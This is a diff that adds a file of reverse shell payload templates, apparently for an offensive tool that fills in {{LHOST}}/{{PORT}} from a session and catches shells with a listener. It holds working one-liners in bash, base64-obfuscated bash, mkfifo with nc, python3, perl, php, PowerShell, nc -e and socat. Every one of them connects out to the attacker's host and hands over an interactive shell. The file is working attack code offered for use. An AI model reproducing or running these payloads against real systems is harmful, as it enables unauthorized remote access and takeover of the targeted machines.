@@ -1,0 +1,29 @@
+# Reverse shells. {{LHOST}}/{{PORT}} are filled from the session.
+# Catch with `listen` (penelope: auto TTY upgrade + session logging).
+
+# bash tcp
+bash -i >& /dev/tcp/{{LHOST}}/{{PORT}} 0>&1
+
+# bash tcp, base64 wrapped — run this one locally, paste what it prints
+echo "bash -c '{echo,$(printf 'bash -i >& /dev/tcp/{{LHOST}}/{{PORT}} 0>&1' | base64 -w0)}|{base64,-d}|bash'"
+
+# sh via mkfifo (no bash, no /dev/tcp)
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {{LHOST}} {{PORT}} >/tmp/f
+
+# python3 pty (lands as a real tty)
+python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("{{LHOST}}",{{PORT}}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'
+
+# perl
+perl -e 'use Socket;$i="{{LHOST}}";$p={{PORT}};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'
+
+# php
+php -r '$s=fsockopen("{{LHOST}}",{{PORT}});exec("/bin/sh -i <&3 >&3 2>&3");'
+
+# powershell tcp client
+powershell -nop -c "$c=New-Object System.Net.Sockets.TCPClient('{{LHOST}}',{{PORT}});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=([text.encoding]::ASCII).GetBytes($r+'PS '+(pwd).Path+'> ');$s.Write($sb,0,$sb.Length);$s.Flush()}
+
+# nc with -e (rare, but free when it is there)
+nc -e /bin/sh {{LHOST}} {{PORT}}
+
+# socat, fully interactive both ends (listener: socat file:`tty`,raw,echo=0 tcp-listen:{{PORT}})
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{{LHOST}}:{{PORT}}
